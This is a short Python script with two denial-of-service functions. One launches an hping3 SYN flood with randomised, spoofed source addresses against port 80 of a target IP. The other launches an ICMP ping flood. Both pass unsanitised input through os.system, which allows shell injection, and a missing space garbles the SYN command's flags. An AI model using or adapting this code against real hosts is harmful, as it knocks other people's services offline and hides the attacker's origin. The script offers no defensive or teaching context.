import os

def synFlood(ip):
    port = 80
    package_count = 15000
    packet_size = 120

    os.system("hping3 -c " + str(package_count) + " -d " + str(packet_size) + "-S -w 64 -p " + str(port) + " --flood --rand-source " + str(ip))

def pingFlood(ip):
    os.system("hping3 --icmp --flood " + str(ip))